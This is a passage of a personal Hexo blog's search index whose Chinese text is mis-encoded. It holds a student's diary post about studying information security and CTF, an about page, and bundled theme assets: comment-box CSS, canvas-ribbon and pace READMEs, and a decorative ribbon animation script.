èŠå§ï¼Œä¸€ä¸ªäººååœ¨å¯ä»¥é€šå®µçš„è‡ªä¹ å®¤é‡Œï¼Œåªæœ‰ä¸€ä¸ªäººçš„æ—¶å€™ä¹Ÿå› ä¸ºç¯å¢ƒè€Œç¡ä¸ç€ï¼Œå°±ä¼šåšäº›å¯¹ç°åœ¨â€œæ²¡æœ‰æ„ä¹‰â€çš„äº‹æƒ…...\n\næœ‰äººè¯´ï¼Œä¸ºä»€ä¹ˆä¸å»æœŸæœ«å¤ä¹ ï¼Ÿä¸‹ä¸€å‘¨å°±æ˜¯æœŸæœ«å‘¨ï¼Œæœ‰å¾ˆå¤šæœŸæœ«è€ƒè¯•....åªèƒ½è¯´å®åœ¨æ˜¯æ²¡å…´è¶£å°†æ—¶é—´èŠ±åœ¨å¤ä¹ ä¸Šäº†ï¼Œé«˜ä¸‰é‚£ä¸ªå¤ä¹ å·²ç»è®©æˆ‘è®¤æ¸…äº†ï¼Œè¿é ç€è€å¸ˆä¸€è½®äºŒè½®åˆ°ä¸‰è½®ï¼Œæˆ‘å§‹ç»ˆæ˜¯ï¼šé¢˜ç›®çŸ¥è¯†ç‚¹ä¼šçš„éƒ½ä¼šå†™ï¼Œä¸ä¼šçš„åŸºæœ¬éƒ½ä¸ä¼šå†™ï¼Œæ›´åˆ«æåˆ°äº†å¤§å­¦äº†...ä¸Šè¯¾è®¤çœŸå¬åº”ä»˜é‚£ä¸ªé«˜æ•°é¢˜ï¼ˆæˆ‘ä¸Šè¯¾å¬é«˜æ•°å¬çš„è®¤çœŸäº›ï¼‰ï¼ŒæœŸæœ«åŸºæœ¬éƒ½ä¼š...ä½†çº¿ä»£å®åœ¨æ˜¯é è‡ªå­¦ï¼ŒåŠ ä¸Šè‡ªå·±æ²¡ä»€ä¹ˆé©±åŠ¨åŠ›ï¼Œçº¿ä»£å­¦çš„ä¸€å¨å¤§ä¾¿ã€‚å€’ä¹Ÿä¸è‡³äºæŒ‚ç§‘ä»€ä¹ˆçš„ï¼Œä½†å°±æ˜¯å†™èµ·æ¥ä¸æ˜¯å¾ˆçˆ½ï¼Œå¦‚æ­¤å¾ªç¯ï¼Œæ²¡äº†å…´è¶£ã€‚\n\nç„¶åå°±å¼€å§‹åšæœ‰å…´è¶£çš„äº‹æƒ…äº†ã€‚éšæ‰‹æ‰“å¼€ä¸€ç¯‡ä¹‹å‰æ‰“æ ¡CTFæ— æ„é—´æœåˆ°HNUä¿¡å®‰å­¦é•¿çš„åšå®¢ â€œæˆ‘ä¸ºä½•æƒ³å»ºç«‹HNUä¿¡å®‰äº¤æµç¾¤â€ ã€‚è§ï¼š [å­¦é•¿åšå®¢é“¾æ¥](https://mo-xiaoxi.github.io/2016/05/30/HnuSec/)ï¼Œå†çœ‹ä¸€éï¼Œæœ‰äº†å¥½å¤šæ–°çš„æ”¶è·ã€‚\n\nå°±è¯´é‡Œé¢ç®€å•çš„ä¸€ä¾‹ï¼Œå­¦é•¿è¯´HNUçš„ä¿¡å®‰å­¦ä¹ æ°›å›´ä¸è¶³ï¼Œæˆ‘ä¹Ÿåˆ‡èº«æ„Ÿå—åˆ°äº†...ä¸åƒACMé‚£è¾¹ï¼Œæ ¡è®­é˜ŸåŠ å´æ˜Šè€å¸ˆä½œä¸ºé‡‘ç‰Œæ•™ç»ƒçš„æ°”æ°›çƒ˜æ‰˜è¿˜è¿›äº†å‡ æ¬¡world finalï¼Œåœ¨HNUä¿¡å®‰çš„CTFæˆ‘è¿æ ¡é˜Ÿéƒ½æ²¡è§åˆ°æ¶ˆæ¯è¿‡...å¤§å®¶éƒ½æ˜¯å¤§ä¸€ï¼Œçœ‹HNUçš„ACMå¥½åƒå¾ˆå‰å®³ï¼Œå¤§å®¶éƒ½åœ¨å¾€é‚£è¾¹å‘å±•å»äº†ï¼Œåˆ·ç®—æ³•ï¼Œåšç¨‹åºé¢˜ï¼Œæ‰“codeforceså•Šç‰›å®¢å•Šä»€ä¹ˆçš„...å°±è¿ç¨‹åºè®¾è®¡è¿™é—¨è¯¾ç¨‹ï¼Œæœ‰å¥½å‡ æ¬¡ä½œä¸šéƒ½ä¸åƒæ˜¯åŸºç¡€é¢˜ï¼Œåƒæ˜¯ä»ç®—æ³•é¢˜é‡Œé¢æ‘˜ä¸‹æ¥ç»™æˆ‘ä»¬åšçš„ï¼Œä¸€çœ‹è€å¸ˆè®²è§£ï¼Œä¸€çœ‹æ˜¯oieræ‰å¸¸ç”¨çš„çŸ¥è¯†...å“ï¼Œç†è§£ä¿¡å®‰æœ¬æ¥äººæ•°åŸºæ•°å°±å°‘ï¼Œæ‹›ç”Ÿä¹Ÿå¾ˆå°‘ï¼Œåªæ˜¯ä¸ºäº†å­¦è®¡ç®—æœºçš„ï¼Œæˆ–è€…æ¥ä¸äº†è®¡ç§‘ç”µæ°”è°ƒå‰‚æ¥ä¿¡å®‰çš„...éƒ½æ¥äº†ã€‚ç„¶åå°±å‘ç°ï¼Œå¤§å®¶éƒ½å¯¹ä¿¡å®‰å¥½åƒ...æ²¡æœ‰æ¦‚å¿µï¼Ÿä¸èƒ½è¯´æ²¡æœ‰å…´è¶£ï¼Œæåˆ°ç½‘å®‰å¤§å®¶éƒ½æ˜¯æƒ³åˆ°é»‘å®¢ï¼Œé»‘å®¢å¾ˆé…·ï¼Œä¹Ÿæœ‰å…´è¶£ï¼Œä½†çœŸæ­£æ¥å‚ä¸è¡ŒåŠ¨çš„ï¼Œä¸€èµ·è®¨è®ºCTFçš„ï¼ŒçœŸçš„å¤ªå°‘å¤ªå°‘äº†...æ‰“åœºæ ¡èµ›ï¼Œèµ›äº‹ç¾¤é‡Œ100å¤šå·äººï¼Œæ¥æ‰“çš„æ–°ç”Ÿå°±20å¤šä¸ªäºº...å¤§å®¶éƒ½ä¸æ„¿æ„å°è¯•ï¼Œå› ä¸ºæ²¡æ¥è§¦è¿‡ï¼Œç”šè‡³æ²¡äº†è§£è¿‡...å› ä¸ºæ²¡äº†è§£è¿‡ï¼Œæ‰€ä»¥æ›´ä¸æ•¢å°è¯•äº†ã€‚ç„¶åå¸¦æ¥çš„æ˜¯ä¿¡å®‰æ°›å›´æ›´ä¸è¶³çš„è§ç‘Ÿ...\n\næœ‰ç‚¹è¿·èŒ«ã€‚æˆ‘æƒ³è¯•è¯•CTFï¼Œå› ä¸ºæˆ‘è§‰å¾—å®ƒçœŸçš„å¾ˆæœ‰è¶£...ä½†æˆ‘åˆä¸çŸ¥é“æˆ‘ä¸‹ä¸€æ­¥å¾€å“ªé‡Œèµ°ã€‚æˆ‘æ˜¯ä¿¡æ¯å®‰å…¨ä¸“ä¸šçš„å¤§å­¦ç”Ÿï¼Œä½†æˆ‘é¦–å…ˆæ˜¯ä¸ªå¤§å­¦ç”Ÿï¼Œæˆ‘å¾—å…ˆä¿è¯æˆ‘çš„è¯¾ç¨‹ä»»åŠ¡ï¼Œæˆ‘ä¸èƒ½è½ä¸‹ä»€ä¹ˆ...é™¤æ­¤ä¹‹å¤–ï¼Œå­¤ç‹¬ä¹Ÿæ˜¯æˆ‘çš„è¿·é›¾...æˆ‘åœ¨å­¦æ ¡é‡Œä¹Ÿæ²¡æ‰¾åˆ°ä»€ä¹ˆåŒå¹´çº§çš„åŒå¥½ï¼Œåˆèƒ†æ€¯äºä¸»åŠ¨ç¤¾äº¤äºå­¦é•¿å­¦å§ï¼ˆæˆ‘æ‰¿è®¤è¿™æ˜¯æˆ‘çš„ä¸€ä¸ªç¼ºç‚¹ï¼Œä½†ä»å°åˆ°å¤§éƒ½æ˜¯è¿™æ ·...ï¼‰ï¼Œåˆæ‰¾ä¸åˆ°å¯ä»¥æŒ‡å¼•æˆ‘èµ°çš„å¯ä»¥äº¤æµçš„è€å¸ˆï¼ŒçœŸçš„å¾ˆè¿·èŒ«...æˆ‘åªèƒ½ä¸€ééçš„è‡ªå·±ç§ä¸‹åšä¸€äº›CTFçš„ç»ƒä¹ ï¼Œå¯¹ï¼Œç»ƒä¹ ï¼Œä¸æ˜¯è®­ç»ƒï¼Œä¸€ç‚¹ä¸€ç‚¹å•œé¥®ä¸€äº›çŸ¥è¯†...\n\næˆ‘æœ‰æ—¶å€™ä¹Ÿåœ¨æƒ³ï¼Œæˆ‘æ‰å¤§ä¸€ï¼Œç”šè‡³æ‰å¤§ä¸€ä¸Šå†Œï¼Œå¯¹ä¸€åˆ‡è¿·èŒ«å¾ˆæ­£å¸¸ï¼Œä¸å¿…è¦å¤ªè¿½æ±‚ä»€ä¹ˆä¸œè¥¿ï¼Œè¯¥æ¥çš„æ€»æ˜¯ä¼šæ¥çš„ã€‚ä½†æˆ‘ä¹Ÿåœ¨æƒ³ï¼Œæˆ‘æ—¢ç„¶æ˜¯å¤§ä¸€ï¼Œé‚£æˆ‘ä¹Ÿè¦å¥½å¥½çœ‹çœ‹å¤§ä¸€æˆ‘èƒ½åšä»€ä¹ˆå§ï¼Œå¤šåšä¸€ç‚¹ï¼Œè¿™æ ·ä»¥åçš„ç©ºé—²å°±æ›´å¤šä¸€ç‚¹ï¼ˆè™½ç„¶å¯èƒ½æ˜¯ä¸ªæ— åº•æ´äº†å“ˆå“ˆå“ˆï¼‰ï¼Œç„¶åæˆ‘å¯ä»¥æŠŠè¿™äº›ç©ºé—²çš„æ—¶é—´ï¼Œç”¨æ¥å‘å‘†ï¼Œç”¨æ¥çœ‹AIå†™æ•…äº‹ï¼Œç”¨æ¥å‘¼å‘¼å¤§ç¡å»æ¢¦é‡Œç©ï¼Œç”šè‡³åƒè¿™æ ·åšæœ‰å…´è¶£çš„äº‹æƒ…ï¼Œä¸€ç‚¹ä¸€ç‚¹åšäº›æˆ‘èˆ’é€‚çš„äº‹æƒ…...ä¸€ç‚¹ä¸€ç‚¹æ”¶é›†æˆ‘è‡ªå·±çš„å°å¿«ä¹ã€‚\n\næˆ‘è¿˜æ˜¯åƒè¿‡å»ä¸€æ ·æœŸå¾…ç€æœªæ¥ã€‚\n","tags":["æ‚è°ˆ"],"categories":["æ‚è°ˆ"]},{"url":"/Templates/Addimages.html","content":"![image](images/{{tp.file.title}}/{{tp.date.now(\"YYYYMMDD-HHMMSS\")}}.png)"},{"title":"<% tp.file.title %>","url":"/Templates/hexo-template.html","content":"# <% tp.file.title %>\n\n\n\n"},{"title":"å…³äº","url":"/about/index.html","content":"# ä½ å¥½ï¼Œæˆ‘æ˜¯Moyuinã€‚\n**ç¼¥ç¼ˆï¼Œæ¸¸è¡ï¼Œæ²¡æœ‰æ¥è·¯ä¸å½’å¤„ã€‚**\n## About me\n- HNUä¿¡æ¯å®‰å…¨ä¸“ä¸šå¤§ä¸€å­¦ç”Ÿã€‚\n- ISTP,ä½†ä¸æ¢è®¨MBTIã€‚\n- å–œæ¬¢ä¹¦å†™æ•…äº‹ï¼Œä½†åˆè¾ƒä¸ºæ‡’æƒ°ã€‚\n- HFAæ‚£è€…ï¼Œé²œä¸äººæ¥è§¦ï¼Œä¹Ÿæ²¡æœ‰ä¸äººæ¥è§¦çš„æƒ³æ³•ã€‚\n- å¸Œæœ›ä¸ä¼—ä¸åŒã€‚\n\n## About blog\n- ä¸€äº›**ç”Ÿæ´»æ‚è°ˆ**ğŸ’­\nä¸€èˆ¬æƒ³åˆ°ä»€ä¹ˆå†™ä»€ä¹ˆï¼Œæˆ‘çš„æ–‡å­—æ¯”è¾ƒæŠ½ç¦»é£˜æ¸º...\nä¸€èˆ¬ä¼šåœ¨å¤‡å¿˜å½•é‡Œå†™ï¼Œåæ¥å‘ç°å†™åœ¨åšå®¢é‡Œè¿˜æ›´æœ‰æ„ä¹‰ä¸€äº›ï¼Œä»¥åæƒ³ä¸èµ·æ¥è¿˜å¯ä»¥çœ‹ã€‚\nå¯¹ç”Ÿæ´»ä¸çˆ½å°±ä¼šå†™ç‚¹ä¸œè¥¿ã€‚\n\n- ä¸€äº›**æ—¥å¿—è®°å½•**ğŸ““\nä¸»è¦æ˜¯æ—¥è®°å½¢å¼çš„ï¼š\n  - å¯èƒ½è®°ä¸‹ä¸€äº›è‡ªå·±å¾ˆæƒŠå¹çš„ä¸œè¥¿...é‚£äº›åˆ«äººçš„äººç”Ÿç…§ç‰‡ï¼Œæˆ–è€…è§‰å¾—å¾ˆå¥½çœ‹çš„æ‘„å½±ä½œå“ã€‚\n  - æˆ–è€…çœ‹äº†ä¹¦ï¼Œä¸€äº›æ€è€ƒ...è™½ç„¶æˆ‘ç°åœ¨çœ‹ä¹¦çœ‹çš„å°‘ï¼Œæ€»æ˜¯è¯»å¿«é¤æ–‡å­¦ã€‚\n  - æˆ–æ˜¯ä»€ä¹ˆå¬åˆ°äº†ç›´å‡»å¿ƒçµçš„æ­Œæ›²ï¼Œè®°å½•ä¸‹å¬æ­Œçš„æ„Ÿå—ï¼Œæƒ…æ„Ÿã€‚\n  - æˆ–è€…åšåˆ°äº†ä»€ä¹ˆå¾ˆä¸ä¸€æ ·çš„äº‹æƒ…ï¼Œè®°å½•ä¸‹æ¥ã€‚\n\n- ä¸€äº›**å­¦ä¹ æ—¥å¿—**ğŸ“°\n    - å’ŒåŒå­¦å®Œæˆçš„å­¦ä¹ æŠ¥å‘Šï¼Œæ˜¯æœ‰çœŸå®æˆåˆ†çš„ï¼Œæˆ‘ä¸Šä¼ ä¸Šå»æ°¸ä¹…ä¿å­˜ï¼\n    - è‡ªå·±å†™çš„æŠ¥å‘Šï¼Œæ¯”å¦‚ä¹‹å‰æ¯”èµ›çš„wpï¼Œæˆ–è€…æ€»ç»“ä»€ä¹ˆçš„...å“ªå¤©æƒ³èµ·å“ªå¤©ä¼ ã€‚\n\n## ä¸ºä»€ä¹ˆè¦å†™åœ¨åšå®¢é‡Œï¼Ÿ\nç­”æ¡ˆå¾ˆç®€å•ï¼š**è§‰å¾—æœ‰ä¸€ä¸ªè‡ªå·±çš„åšå®¢ç½‘ç«™ç‰¹åˆ«å¸…ğŸ˜**\nè¿˜æœ‰çœ‹äº†å¾ˆå¤šå­¦é•¿å­¦å§ä¹Ÿæœ‰è‡ªå·±çš„åšå®¢ï¼Œè‡ªå·±ä¹Ÿæƒ³è¯•è¯•ï¼Œæ°å¥½ï¼Œæˆ‘èƒ½åšåˆ°ï¼Œä¸ºä»€ä¹ˆä¸è¿™ä¹ˆåšå‘¢ï¼Ÿ\nä»¥å‰æ€»æ˜¯å†™åœ¨qqç©ºé—´é‡Œï¼Œä½†éšç€äººåŠ çš„è¶Šæ¥è¶Šå¤šï¼Œè‡ªå·±ä¹Ÿæ²‰é»˜èµ·æ¥äº†ã€‚\nç°åœ¨æœ‰äº†è¿™ä¸ªå°ç½‘ç«™ï¼Œåˆšå¥½æœ‰ä¸€ä¸ª**åªè¦æˆ‘ä¸åˆ†äº«ç»™åˆ«äººï¼Œåˆ«äººå°±ä¸çŸ¥é“è¿™ä¸ªå‘ç‰¢éªšçš„äººåœ¨ç°å®é‡Œæ˜¯è°**çš„æœºä¼šã€‚\nä¸»è¦è¿˜æ˜¯è®°å½•ç»™è‡ªå·±çœ‹ã€‚\nè¿™é‡Œä½œä¸ºè‡ªå·±åœ¨**è¿™äº’è”ç½‘å¤©åœ°çš„ä¸€éƒ¨åˆ†**ï¼Œæˆ–è®¸ä¹Ÿæ˜¯ä¸ªå½’å¤„ã€‚\n\n## è”ç³»æ–¹å¼\n- ğŸ“§ é‚®ç®±ï¼š[me@moyuin.top](mailto:me@moyuin.top)\n- ğŸ± GitHub: [Moyuin](https://github.com/Moyuin-aka)\n\n\n\n\n\n\n"},{"title":"åˆ†ç±»","url":"/categories/index.html"},{"title":"æ¨è","url":"/link/index.html","content":"\n"},{"title":"æœç´¢","url":"/search/index.html"},{"title":"æ ‡ç­¾","url":"/tags/index.html"},{"url":"/css/custom/twikoo_beautify.css","content":"/* è‡ªå®šä¹‰twikooè¯„è®ºè¾“å…¥æ¡†é«˜åº¦ */\n.tk-input.el-textarea__inner {\n    height: 130px !important;\n  }\n  /* è¾“å…¥è¯„è®ºæ—¶è‡ªåŠ¨éšè—è¾“å…¥æ¡†èƒŒæ™¯å›¾ç‰‡ */\n  .tk-input.el-textarea__inner:focus {\n    background-image: none !important;\n  }\n  /* è°ƒæ•´æ¥¼ä¸­æ¥¼æ ·å¼ ï¼Œæ•´ä½“å·¦ç§»ï¼Œè´´åˆæ°”æ³¡åŒ–æ•ˆæœ */\n  .tk-replies {\n    left: -70px;\n    width: calc(100% + 70px);\n  }\n  /* å¤´åƒå®½åº¦è°ƒæ•´ remå•ä½ä¸å…¨å±€å­—ä½“å¤§å°æŒ‚é’©ï¼Œéœ€é…åˆè‡ªå·±æƒ…å†µè°ƒæ•´å¤§å°ä»¥ä¿è¯å¤´åƒæ˜¾ç¤ºå®Œæ•´*/\n  .tk-avatar {\n    width: 3rem !important;\n    height: 3rem !important;\n  }\n  .tk-avatar img {\n    width: 3rem !important;\n    height: 3rem !important;\n  }\n  /* å›å¤æ¡†å·¦ç§»ï¼Œé¿å…çª„å±æ—¶å‡ºæ¡† */\n  .tk-comments-container .tk-submit {\n    position: relative;\n    left: -70px;\n  }\n  /* è¯„è®ºå—æ°”æ³¡åŒ–ä¿®æ”¹ */\n  .tk-content {\n    background: #8b8b8b; /*é»˜è®¤æ¨¡å¼è®¿å®¢æ°”æ³¡é…è‰²*/\n    padding: 10px;\n    left: 8px;\n    color: #fff; /*é»˜è®¤æ¨¡å¼è®¿å®¢æ°”æ³¡å­—ä½“é…è‰²*/\n    border-radius: 10px;\n    font-size: 16px !important;\n    width: fit-content;\n    max-width: 100%;\n    position: relative !important;\n    overflow: visible !important;\n    max-height: none !important;\n  }\n  /* ä¿®å¤å›¾ç‰‡å‡ºæ¡† */\n  .tk-content img {\n    max-width: 100% !important;\n  }\n  /* ä¿®å¤è¿‡é•¿æ–‡æœ¬å‡ºæ¡† */\n  .tk-content pre {\n    white-space: pre-wrap;\n    word-wrap: break-word;\n  }\n  .tk-content a {\n    color: #eeecaa; /*é»˜è®¤æ¨¡å¼è¶…é“¾æ¥é…è‰²*/\n  }\n  .tk-content p {\n    margin-top: 0px;\n    margin-bottom: 0px;\n  }\n  .tk-content::before {\n    content: \"\";\n    width: 0;\n    height: 0;\n    position: absolute;\n    top: 20px;\n    left: -13px;\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #8b8b8b; /*é»˜è®¤æ¨¡å¼è®¿å®¢æ°”æ³¡å°ä¸‰è§’é…è‰²*/\n    border-left: 0px solid transparent;\n  }\n  .tk-master .tk-content {\n    background: #ff8080; /*é»˜è®¤æ¨¡å¼åšä¸»æ°”æ³¡é…è‰²*/\n    color: #fff; /*é»˜è®¤æ¨¡å¼åšä¸»æ°”æ³¡å­—ä½“é…è‰²*/\n    width: fit-content;\n    max-width: 100%;\n    left: 9px;\n  }\n  .tk-master .tk-content a {\n    color: #eeecaa;\n  }\n  .tk-master .tk-content::before {\n    content: \"\";\n    width: 0;\n    height: 0;\n    position: absolute;\n    top: 20px;\n    left: -13px;\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #ff8080; /*é»˜è®¤æ¨¡å¼åšä¸»æ°”æ³¡å°ä¸‰è§’é…è‰²*/\n    border-left: 0px solid transparent;\n  }\n  .tk-row[data-v-d82ce9a0] {\n    max-width: 100%;\n    width: fit-content;\n    margin-left: 10px;\n  }\n  .tk-avatar {\n    border-radius: 50%;\n    margin-top: 40px;\n  }\n  .tk-master .tk-avatar {\n    position: relative;\n    left: 6px;\n  }\n  \n  /* å¤œé—´æ¨¡å¼é…è‰²ï¼Œå…·ä½“æ¯”ç…§ä¸Šæ–¹é»˜è®¤æ¨¡å¼class */\n  [data-theme=\"dark\"] .tk-content {\n    background: #1d1d1f;\n    color: #fff;\n  }\n  [data-theme=\"dark\"] .tk-content a {\n    color: #dfa036;\n  }\n  [data-theme=\"dark\"] .tk-content::before {\n    border-right: 15px solid #1d1d1f;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content {\n    background: #1c1c1e;\n    color: #fff;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content a {\n    color: #dfa036;\n  }\n  [data-theme=\"dark\"] .tk-master .tk-content::before {\n    border-top: 2px solid transparent;\n    border-bottom: 20px solid transparent;\n    border-right: 15px solid #1c1c1e;\n    border-left: 0px solid transparent;\n  }\n  \n  .tk-master .tk-extras {\n    float: left;\n    margin-left: 10px;\n  }\n  .tk-extras {\n    margin-left: 10px;\n  }\n  \n  .tk-comments-title[data-v-2619081a] {\n    margin-bottom: 0px;\n  }\n  \n  /* è‡ªé€‚åº”å†…å®¹ */\n  @media screen and (min-width: 1024px) {\n    /* è®¾ç½®å®½åº¦ä¸Šé™ï¼Œé¿å…æŒ¤å‹åšä¸»å¤´åƒ */\n    .tk-content {\n      max-width: 75%;\n      width: fit-content;\n    }\n    .tk-master .tk-content {\n      width: fit-content;\n      float: right;\n      margin-right: 110px;\n    }\n    .tk-master .tk-content::before {\n      left: 100%;\n      border-left: 15px solid #ff8080;\n      border-right: 0px solid transparent;\n    }\n    .tk-master .tk-avatar {\n      position: relative;\n      left: calc(75% + 120px);\n    }\n    .tk-master .tk-row[data-v-d82ce9a0] {\n      position: relative;\n      top: 0px;\n      /* left: calc(55%); */\n      float: right;\n      margin-right: 100px;\n      margin-left: 200px;\n    }\n    .tk-master .tk-content[data-v-d82ce9a0] {\n      margin-top: 5px;\n    }\n    .tk-master .tk-extras {\n      float: right;\n      margin-right: 100px;\n      margin-left: 200px;\n    }\n    [data-theme=\"dark\"] .tk-master .tk-content::before {\n      border-left: 15px solid #1c1c1e;\n      border-right: 0px solid transparent;\n    }\n  }"},{"url":"/lib/canvas-ribbon/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/hustcc/ribbon.js\">canvas-ribbon.js</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file:\n\n```yml\ncanvas_ribbon:\n  enable: true\n```\n\n**And, if you wants to use the CDN, then need to set:**\n\n```yml\nvendors:\n  ...\n  canvas_ribbon: //cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/canvas-ribbon\n$ git pull\n```\n"},{"url":"/lib/canvas-ribbon/canvas-ribbon.js","content":"/**\n * Copyright (c) 2016 hustcc\n * License: MIT\n * Version: v1.0.1\n * GitHub: https://github.com/hustcc/ribbon.js\n**/\n/*jshint -W030 */\n! function() {\n  function attr(node, attr, default_value) {\n    return Number(node.getAttribute(attr)) || default_value;\n  }\n\n  // get user config\n  var scripts = document.getElementsByTagName('script'),\n    script = scripts[scripts.length - 1]; // å½“å‰åŠ è½½çš„script\n  config = {\n    z: attr(script, \"zIndex\", -1), // z-index\n    a: attr(script, \"alpha\", 0.6), // alpha\n    s: attr(script, \"size\", 90), // size\n  };\n\n  var canvas = document.createElement('canvas'),\n    g2d = canvas.getContext('2d'),\n    pr = window.devicePixelRatio || 1,\n    width = window.innerWidth,\n    height = window.innerHeight,\n    f = config.s,\n    q, t,\n    m = Math,\n    r = 0,\n    pi = m.PI*2,\n    cos = m.cos,\n    random = m.random;\n  canvas.width = width * pr;\n  canvas.height = height * pr;\n  g2d.scale(pr, pr);\n  g2d.globalAlpha = config.a;\n  canvas.style.cssText = 'opacity: ' + config.a + ';position:fixed;top:0;left:0;z-index: ' + config.z + ';width:100%;height:100%;pointer-events:none;';\n  // create canvas\n  document.getElementsByTagName('body')[0].appendChild(canvas);\n\n  function redraw() {\n    g2d.clearRect(0, 0, width, height);\n    q = [{x: 0, y: height * 0.7 + f}, {x: 0, y: height * 0.7 - f}];\n    while(q[1].x < width + f) draw(q[0], q[1]);\n  }\n  function draw(i, j) {\n    g2d.beginPath();\n    g2d.moveTo(i.x, i.y);\n    g2d.lineTo(j.x, j.y);\n    var k = j.x + (random()*2-0.25)*f, n = line(j.y);\n    g2d.lineTo(k, n);\n    g2d.closePath();\n    r -= pi / -50;\n    g2d.fillStyle = '#'+(cos(r)*127+128<<16 | cos(r+pi/3)*127+128<<8 | cos(r+pi/3*2)*127+128).toString(16);\n    g2d.fill();\n    q[0] = q[1];\n    q[1] = {x: k, y: n};\n  }\n  function line(p){\n    t = p + (random() * 2 - 1.1) * f;\n    return (t > height || t < 0) ? line(p) : t;\n  }\n\n  document.onclick = redraw;\n  document.ontouchstart = redraw;\n  redraw();\n}();\n"},{"url":"/lib/pace/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/HubSpot/pace\">Progress bar</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file and select your theme:\n\n```yml\npace:\n  enable: true\n  # Themes list:\n  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple\n  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal\n  theme: minimal\n```\n\n**And, if you wants to use the CDN, then need to set:** (you also need to find your corresponding theme css link in <a href=\"https://www.jsdelivr.com/package/npm/pace-js?path=themes\">jsdelivr</a>)\n\n```yml\nvendors:\n  ...\n  pace: //cdn.jsdelivr.net/npm/pace-js@1/pace.min.js\n  pace_css: //cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/pace\n$ git pull\n```\n"},{"url":"/lib/pace/pace-theme-barber-shop.min.css","content":".pace,.pace .pace-progress{width:100%;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;height:12px;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#29d;position:fixed;top:0;bottom:0;right:100%}.pace .pace-activity{right:-32px;bottom:0;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);background-image:-webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,.2)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,.2)),color-stop(.75,rgba(255,255,255,.2)),color-stop(.75,transparent),to(transparent));background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-moz-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);-webkit-background-size:32px 32px;-moz-background-size:32px 32px;-o-background-size:32px 32px;background-size:32px 32px;-webkit-animation:pace-theme-barber-shop-motion .5s linear infinite;-moz-animation:pace-theme-barber-shop-motion .5s linear infinite;-ms-animation:pace-theme-barber-shop-motion .5s linear infinite;-o-animation:pace-theme-barber-shop-motion .5s linear infinite;animation:pace-theme-barber-shop-motion .5s linear infinite}@-webkit-keyframes pace-theme-barber-shop-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-32px,0);transform:translate(-32px,0)}}@-moz-keyframes pace-theme-barber-shop-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-32px,0);transform:translate(-32px,0)}}@-o-keyframes pace-theme-barber-shop-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-32px,0);transform:translate(-32px,0)}}@-ms-keyframes pace-theme-barber-shop-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-32px,0);transform:translate(-32px,0)}}@keyframes pace-theme-barber-shop-motion{0%{transform:none}100%{transform:translate(-32px,0)}}"},{"url":"/lib/pace/pace-theme-big-counter.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace.pace-inactive .pace-progress{display:none}.pace 